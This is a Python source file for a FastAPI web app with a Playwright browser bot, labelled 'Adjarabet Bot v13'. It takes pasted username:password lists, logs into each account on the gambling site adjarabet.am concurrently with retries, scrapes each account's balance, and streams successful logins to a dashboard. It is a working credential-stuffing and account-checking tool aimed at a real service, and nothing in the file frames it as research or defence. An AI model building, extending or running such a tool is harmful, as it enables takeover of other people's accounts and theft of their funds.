import asyncio
import json
import logging
import os
import re
from dataclasses import dataclass, asdict
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import List
from contextlib import asynccontextmanager

import aiofiles
import uvicorn
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

# =========================================================
# CONFIG
# =========================================================

class Config:
    HOST = os.getenv("HOST", "0.0.0.0")
    PORT = int(os.getenv("PORT", 8000))

    HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"

    TIMEOUT = int(os.getenv("TIMEOUT", 25000))

    MAX_RETRIES = int(os.getenv("MAX_RETRIES", 2))

    CONCURRENT_BROWSERS = int(os.getenv("CONCURRENT_BROWSERS", 2))

    RESULTS_DIR = Path("results")
    LOG_DIR = Path("logs")

    RESULTS_DIR.mkdir(exist_ok=True)
    LOG_DIR.mkdir(exist_ok=True)


# =========================================================
# LOGGER
# =========================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler("logs/bot.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger("BOT")


# =========================================================
# MODELS
# =========================================================

class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"
    TIMEOUT = "⏰"
    BLOCKED = "🚫"


@dataclass
class Account:
    username: str
    password: str
    status: str = "❌"
    balance: str = "0"
    balance_value: float = 0.0
    error: str = ""
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()


# =========================================================
# WS MANAGER
# =========================================================

class WSManager:
    def __init__(self):
        self.clients: List[WebSocket] = []
        self.lock = asyncio.Lock()

    async def connect(self, ws: WebSocket):
        await ws.accept()

        async with self.lock:
            self.clients.append(ws)

    async def disconnect(self, ws: WebSocket):
        async with self.lock:
            if ws in self.clients:
                self.clients.remove(ws)

    async def broadcast(self, message: str):
        dead = []

        async with self.lock:
            for ws in self.clients:
                try:
                    await ws.send_text(message)
                except:
                    dead.append(ws)

            for ws in dead:
                if ws in self.clients:
                    self.clients.remove(ws)


manager = WSManager()


# =========================================================
# BOT
# =========================================================

class AdjarabetBot:
    def __init__(self):
        self.playwright = None
        self.browser = None

        self.running = False

        self.results: List[Account] = []

        self.semaphore = asyncio.Semaphore(
            Config.CONCURRENT_BROWSERS
        )

        self.stats = {
            "processed": 0,
            "success": 0,
            "failed": 0,
            "timeout": 0
        }

    # =====================================================
    # START
    # =====================================================

    async def start(self):
        logger.info("Starting Playwright...")

        self.playwright = await async_playwright().start()

        self.browser = await self.playwright.chromium.launch(
            headless=Config.HEADLESS,
            args=[
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--no-sandbox",
                "--disable-setuid-sandbox"
            ]
        )

        self.running = True

        logger.info("Browser ready")

    # =====================================================
    # STOP
    # =====================================================

    async def stop(self):
        logger.info("Stopping bot...")

        self.running = False

        try:
            if self.browser:
                await self.browser.close()
        except Exception as e:
            logger.error(e)

        try:
            if self.playwright:
                await self.playwright.stop()
        except Exception as e:
            logger.error(e)

        logger.info("Bot stopped")

    # =====================================================
    # SAVE RESULTS
    # =====================================================

    async def save_results(self):
        try:
            path = Config.RESULTS_DIR / "results.json"

            async with aiofiles.open(
                path,
                "w",
                encoding="utf-8"
            ) as f:

                await f.write(
                    json.dumps(
                        [asdict(x) for x in self.results],
                        ensure_ascii=False,
                        indent=2
                    )
                )

        except Exception as e:
            logger.error(f"Save error: {e}")

    # =====================================================
    # PARSE BALANCE
    # =====================================================

    def parse_balance(self, text: str) -> float:
        try:
            cleaned = text.replace(",", "")

            match = re.search(
                r"(\d+\.?\d*)",
                cleaned
            )

            if match:
                return float(match.group(1))

        except:
            pass

        return 0.0

    # =====================================================
    # LOGIN
    # =====================================================

    async def login(self, account: Account):

        async with self.semaphore:

            for attempt in range(Config.MAX_RETRIES):

                if not self.running:
                    return

                context = None
                page = None

                try:
                    context = await self.browser.new_context(
                        viewport={
                            "width": 1280,
                            "height": 720
                        },
                        ignore_https_errors=True
                    )

                    page = await context.new_page()

                    page.set_default_timeout(
                        Config.TIMEOUT
                    )

                    await page.goto(
                        "https://www.adjarabet.am/hy",
                        wait_until="domcontentloaded"
                    )

                    await page.wait_for_selector(
                        'input[name="userIdentifier"]',
                        timeout=10000
                    )

                    await page.fill(
                        'input[name="userIdentifier"]',
                        account.username
                    )

                    await page.fill(
                        'input[type="password"]',
                        account.password
                    )

                    await page.click(
                        '[data-test-id="header-login-button"]'
                    )

                    await page.wait_for_selector(
                        '[data-test-id="header-user-balance"]',
                        timeout=15000
                    )

                    balance_el = await page.query_selector(
                        '[data-test-id="header-user-balance"]'
                    )

                    balance = await balance_el.inner_text()

                    account.balance = balance
                    account.balance_value = self.parse_balance(balance)
                    account.status = AccountStatus.SUCCESS.value

                    self.stats["success"] += 1

                    logger.info(
                        f"SUCCESS {account.username}"
                    )

                    break

                except PlaywrightTimeout:
                    account.status = AccountStatus.TIMEOUT.value
                    account.error = "Timeout"

                    self.stats["timeout"] += 1

                    logger.warning(
                        f"TIMEOUT {account.username}"
                    )

                except Exception as e:
                    account.status = AccountStatus.FAILED.value
                    account.error = str(e)[:120]

                    self.stats["failed"] += 1

                    logger.error(
                        f"ERROR {account.username} | {e}"
                    )

                finally:
                    try:
                        if page:
                            await page.close()
                    except:
                        pass

                    try:
                        if context:
                            await context.close()
                    except:
                        pass

            self.results.append(account)

            self.stats["processed"] += 1

            await self.save_results()

            await manager.broadcast(
                "RESULT:" + json.dumps(
                    asdict(account),
                    ensure_ascii=False
                )
            )

            await manager.broadcast(
                f"PROGRESS:{self.stats['processed']}"
            )

    # =====================================================
    # PROCESS
    # =====================================================

    async def process(self, accounts: List[Account]):

        self.results.clear()

        self.stats = {
            "processed": 0,
            "success": 0,
            "failed": 0,
            "timeout": 0
        }

        tasks = []

        for acc in accounts:
            tasks.append(
                asyncio.create_task(
                    self.login(acc)
                )
            )

        await asyncio.gather(
            *tasks,
            return_exceptions=True
        )

        logger.info("Finished")


bot = AdjarabetBot()


# =========================================================
# FASTAPI
# =========================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    await bot.start()

    yield

    await bot.stop()


app = FastAPI(
    title="Adjarabet Bot",
    version="13.0",
    lifespan=lifespan
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# =========================================================
# HTML
# =========================================================

HTML = """
<!DOCTYPE html>
<html>
<head>
<title>Adjarabet Bot</title>

<style>

body{
background:#0d1117;
color:white;
font-family:Arial;
padding:20px;
}

textarea{
width:100%;
height:250px;
background:#161b22;
color:white;
padding:10px;
border:none;
outline:none;
}

button{
padding:10px 20px;
margin-top:10px;
cursor:pointer;
}

#logs{
margin-top:20px;
height:300px;
overflow:auto;
background:#161b22;
padding:10px;
}

</style>
</head>

<body>

<h1>Adjarabet Bot v13</h1>

<textarea id="accounts"></textarea>

<br>

<button onclick="startBot()">START</button>

<div id="logs"></div>

<script>

let ws = new WebSocket(`ws://${location.host}/ws`)

ws.onmessage = (e)=>{

let logs = document.getElementById('logs')

logs.innerHTML += `<div>${e.data}</div>`

logs.scrollTop = logs.scrollHeight

}

async function startBot(){

let data = document.getElementById('accounts').value

await fetch('/start',{
method:'POST',
body:data
})

}

</script>

</body>
</html>
"""

# =========================================================
# ROUTES
# =========================================================

current_task = None


@app.get("/")
async def home():
    return HTMLResponse(HTML)


@app.post("/start")
async def start(request: Request):

    global current_task

    body = await request.body()

    text = body.decode("utf-8")

    accounts = []

    for line in text.splitlines():

        line = line.strip()

        if not line:
            continue

        if ":" not in line:
            continue

        username, password = line.split(":", 1)

        accounts.append(
            Account(
                username=username.strip(),
                password=password.strip()
            )
        )

    if current_task and not current_task.done():
        current_task.cancel()

    current_task = asyncio.create_task(
        bot.process(accounts)
    )

    return {
        "status": "started",
        "accounts": len(accounts)
    }


@app.get("/results")
async def results():
    return [asdict(x) for x in bot.results]


@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):

    await manager.connect(ws)

    try:
        while True:
            await ws.receive_text()

    except WebSocketDisconnect:
        await manager.disconnect(ws)


# =========================================================
# MAIN
# =========================================================

if __name__ == "__main__":

    uvicorn.run(
        app,
        host=Config.HOST,
        port=Config.PORT,
        log_level="warning",
        access_log=False
    )
